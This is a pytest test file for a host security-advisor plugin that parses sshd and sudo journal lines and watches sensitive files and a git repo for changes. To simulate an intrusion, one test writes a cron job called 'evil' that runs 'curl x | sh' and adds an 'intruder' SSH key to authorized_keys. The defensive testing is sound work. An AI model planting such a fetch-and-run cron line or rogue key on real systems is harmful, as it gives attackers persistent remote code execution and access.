"""Host sources: sshd/sudo journal lines and the file/repo watch."""
import json
import subprocess
import sys
import time

from plugins.security_advisor.sources import files, ssh


def line(ident, message, **extra):
    return json.dumps({"SYSLOG_IDENTIFIER": ident, "MESSAGE": message,
                       "__REALTIME_TIMESTAMP": "1762570000000000", **extra})


def test_parse_accepted_publickey():
    kind, actor, detail = ssh.parse_journal_line(line(
        "sshd", "Accepted publickey for root from 198.51.100.4 port 52814 ssh2: ED25519 SHA256:AbCdEf123"))
    assert kind == "ssh.accepted"
    assert actor == {"ip": "198.51.100.4", "user": "root"}
    assert detail["method"] == "publickey" and detail["key"] == "ED25519 SHA256:AbCdEf123"


def test_parse_failed_password_and_invalid_user():
    kind, actor, detail = ssh.parse_journal_line(line(
        "sshd-session", "Failed password for invalid user admin from 203.0.113.9 port 4242 ssh2"))
    assert kind == "ssh.failed" and actor == {"ip": "203.0.113.9", "user": "admin"}
    assert detail["method"] == "password" and detail["invalid_user"] is True
    kind, actor, _ = ssh.parse_journal_line(line("sshd", "Invalid user oracle from 2001:db8::7 port 1"))
    assert kind == "ssh.failed" and actor["ip"] == "2001:db8::7"


def test_parse_sudo():
    kind, actor, detail = ssh.parse_journal_line(line(
        "sudo", "  pranav : TTY=pts/0 ; PWD=/home/pranav ; USER=root ; COMMAND=/usr/bin/systemctl restart x"))
    assert kind == "sudo.command"
    assert actor == {"user": "pranav", "as_user": "root"}
    assert detail["command"] == "/usr/bin/systemctl restart x"


def test_unrelated_lines_are_none():
    assert ssh.parse_journal_line(line("sshd", "Connection closed by 203.0.113.9 port 22")) is None
    assert ssh.parse_journal_line("not json") is None
    assert ssh.parse_journal_line(line("cron", "Accepted publickey for root from 198.51.100.4 port 1 ssh2")) is None


def test_follower_emits_parsed_lines():
    out = []
    script = "import json;print(json.dumps({'SYSLOG_IDENTIFIER':'sshd','MESSAGE':" \
             "'Failed password for root from 203.0.113.9 port 1 ssh2'}),flush=True)"
    f = ssh.SshFollower(emit=lambda source, kind, actor=None, **d: out.append((source, kind, actor)),
                        cmd=[sys.executable, "-c", script])
    f.start()
    deadline = time.time() + 5
    while not out and time.time() < deadline:
        time.sleep(0.02)
    f.stop()
    assert out[0] == ("host", "ssh.failed", {"ip": "203.0.113.9", "user": "root"})


def test_follower_without_journalctl_reports_unavailable():
    out = []
    f = ssh.SshFollower(emit=lambda source, kind, actor=None, **d: out.append(kind),
                        cmd=["/nonexistent/journalctl"])
    f.start()
    deadline = time.time() + 5
    while not out and time.time() < deadline:
        time.sleep(0.02)
    f.stop()
    assert out == ["host.source_unavailable"] and f.state == "unavailable"


def git(repo, *args):
    subprocess.run(["git", "-C", str(repo), *args], check=True, capture_output=True)


def make_repo(tmp_path):
    repo = tmp_path / "repo"
    (repo / "security").mkdir(parents=True)
    (repo / "app.py").write_text("print('hi')\n")
    (repo / "security" / "x.py").write_text("X = 1\n")
    git(repo, "init", "-q")
    git(repo, "-c", "user.email=t@example.test", "-c", "user.name=t", "add", ".")
    git(repo, "-c", "user.email=t@example.test", "-c", "user.name=t", "commit", "-qm", "init")
    return repo


def test_filewatch_baseline_then_changes(tmp_path):
    repo = make_repo(tmp_path)
    watched_file = tmp_path / "authorized_keys"
    watched_file.write_text("ssh-ed25519 AAAA test\n")
    watched_dir = tmp_path / "cron.d"
    watched_dir.mkdir()
    (watched_dir / "job").write_text("* * * * * true\n")
    fw = files.FileWatch(repo, [watched_file, watched_dir, tmp_path / "missing"],
                         tmp_path / "state" / "filewatch.json")
    assert fw.poll() == []                       # first poll is the baseline
    assert fw.poll() == []                       # nothing changed

    watched_file.write_text("ssh-ed25519 AAAA test\nssh-ed25519 BBBB intruder\n")
    (watched_dir / "evil").write_text("* * * * * curl x | sh\n")
    changes = fw.poll()
    assert ("file.changed", {"path": str(watched_file), "change": "modified"}) in changes
    assert ("file.changed", {"path": str(watched_dir / "evil"), "change": "added"}) in changes

    (repo / "app.py").write_text("print('changed')\n")
    kinds = [k for k, _ in fw.poll()]
    assert kinds == ["repo.changed"]

    (repo / "security" / "x.py").write_text("X = 2\n")
    changes = dict(fw.poll())
    assert changes["advisor.code_changed"]["files"] == ["security/x.py"]


def test_filewatch_state_survives_restart(tmp_path):
    repo = make_repo(tmp_path)
    f = tmp_path / "sshd_config"
    f.write_text("PermitRootLogin no\n")
    state = tmp_path / "filewatch.json"
    files.FileWatch(repo, [f], state).poll()
    f.unlink()
    assert files.FileWatch(repo, [f], state).poll() == [
        ("file.changed", {"path": str(f), "change": "removed"})]


def test_filewatch_head_moved(tmp_path):
    repo = make_repo(tmp_path)
    fw = files.FileWatch(repo, [], tmp_path / "fw.json")
    fw.poll()
    (repo / "app.py").write_text("print('v2')\n")
    git(repo, "-c", "user.email=t@example.test", "-c", "user.name=t", "commit", "-qam", "v2")
    moved = [d for k, d in fw.poll() if k == "repo.head_moved"]
    assert len(moved) == 1 and moved[0]["on_origin"] is False and moved[0]["from"] != moved[0]["to"]


def test_default_watched_is_profile_aware(tmp_path, monkeypatch):
    monkeypatch.setenv("HERMES_HOME", str(tmp_path))
    paths = [str(p) for p in files.default_watched()]
    assert str(tmp_path / ".env") in paths and "/etc/ssh/sshd_config" in paths
